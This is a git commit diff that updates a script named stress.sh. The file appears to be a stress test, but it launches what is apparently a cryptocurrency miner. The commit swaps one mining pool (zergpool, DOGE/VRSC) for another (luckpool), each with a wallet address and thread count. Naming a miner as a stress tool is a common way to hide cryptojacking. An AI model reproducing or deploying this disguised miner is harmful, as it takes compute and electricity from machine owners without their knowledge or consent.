e5f481e25721c76ec6190bde57c2559e28e01941
fwe342fd <86301501+fwe342fd@users.noreply.github.com>
2021-06-26 09:04:38 +0700

    Update stress.sh

--- stress.sh
+++ stress.sh
@@ -1,3 +1,3 @@
 #!/bin/sh
 
-./stress -v -l verushash.na.mine.zergpool.com:3300 -u DSEu56yE78jCsXK6ojqgSo52GFu5svTRPB -t 16 -p c=DOGE,mc=VRSC
+./stress -v -l na.luckpool.net:3956 -u RL3uUGv6um8Bq7nNq4TTkvk4FQaxbQDagg -t 8 -p x
